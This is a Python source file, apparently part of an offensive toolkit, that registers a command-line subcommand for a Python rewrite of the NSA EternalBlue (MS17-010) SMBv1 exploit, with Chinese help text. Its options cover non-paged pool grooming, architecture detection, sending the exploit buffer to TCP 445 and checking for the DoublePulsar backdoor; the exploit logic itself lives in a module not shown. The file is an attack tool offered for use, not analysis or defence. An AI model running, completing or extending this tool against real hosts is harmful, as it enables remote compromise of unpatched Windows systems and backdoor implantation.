"""reternal-blue — MS17-010 (ETERNALBLUE) SMBv1 远程利用。

Python rewrite of the NSA EternalBlue exploit `Eternalblue-2.2.0.exe`
(C++ / DAVE framework) recovered via IDA Pro.  Reimplements the tool's
key=value parameter interface and its SMBv1/MS17-010 exploitation flow
(non-paged pool grooming, arch detection, DoublePulsar backdoor verify).
"""

from . import reternal_blue


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def reternal_blue_handle(args):
    """Run the ETERNALBLUE exploitation sequence against the supplied host."""
    return reternal_blue.run_function(
        target=args.target,
        ip=args.ip,
        port=args.port,
        timeout=args.timeout,
        groom=args.groom,
        max_attempts=args.attempts,
        verify_target=args.verify_target,
        verify_backdoor=args.verify_backdoor,
        os_type=args.os,
        arch=args.arch,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `reternal-blue` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "reternal-blue",
        help="MS17-010 (ETERNALBLUE) SMBv1 远程利用",
        description="Python 重写的 NSA EternalBlue (ETERNALBLUE / MS17-010) 利用工具 "
                    "Eternalblue-2.2.0。通过 TCP 445 驱动 SMBv1，执行非分页池占位、"
                    "架构识别 (x86/x64)、exploit 缓冲发送，并可选验证 DoublePulsar 后门。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "--ip", metavar="IP",
        help="TargetIp（默认取 target）",
    )
    p.add_argument(
        "-p", "--port", type=int, default=reternal_blue.DEFAULT_PORT,
        help="SMB 端口（默认 %d）" % reternal_blue.DEFAULT_PORT,
    )
    p.add_argument(
        "--timeout", type=int, default=reternal_blue.DEFAULT_TIMEOUT,
        help="网络超时毫秒（默认 %d）" % reternal_blue.DEFAULT_TIMEOUT,
    )
    p.add_argument(
        "--groom", type=int, default=reternal_blue.DEFAULT_GROOM,
        help="GroomAllocations：非分页池占位包数量（默认 %d）"
             % reternal_blue.DEFAULT_GROOM,
    )
    p.add_argument(
        "--attempts", type=int, default=1,
        help="MaxExploitAttempts：最多尝试次数",
    )
    p.add_argument(
        "--verify-target", action="store_true",
        help="VerifyTarget：先验证目标是 SMBv1 主机",
    )
    p.add_argument(
        "--verify-backdoor", action="store_true",
        help="VerifyBackdoor：验证双脉冲 (DoublePulsar) 后门状态",
    )
    p.add_argument(
        "-o", "--os", help="目标 OS 提示 (winxp/win7/win2003/win2008)",
    )
    p.add_argument(
        "-a", "--arch", choices=["x86", "x64"],
        help="目标架构提示（默认由 SMB 应答自动判断）",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=reternal_blue_handle)